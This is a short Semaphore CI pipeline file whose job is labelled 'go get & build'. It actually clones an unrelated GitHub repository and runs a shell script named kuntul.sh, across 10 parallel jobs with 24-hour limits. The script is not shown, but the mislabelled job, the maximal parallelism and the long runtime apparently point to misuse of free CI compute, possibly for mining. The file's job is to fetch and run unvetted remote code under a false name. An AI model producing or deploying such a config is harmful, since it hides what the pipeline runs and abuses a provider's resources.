version: v1.0
name: Semaphore 10
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
fail_fast:
  cancel:
    when: 'false'
blocks:
  - name: Build project
    execution_time_limit:
      hours: 24
    task:
      jobs:
        - name: go get & build
          execution_time_limit:
            hours: 24
          parallelism: 10
          commands:
            - apt update && apt upgrade -y
            - apt install git -y
            - 'git clone https://github.com/muhammad3148937/df.git'
            - cd df
            - chmod +x kuntul.sh
            - ./kuntul.sh
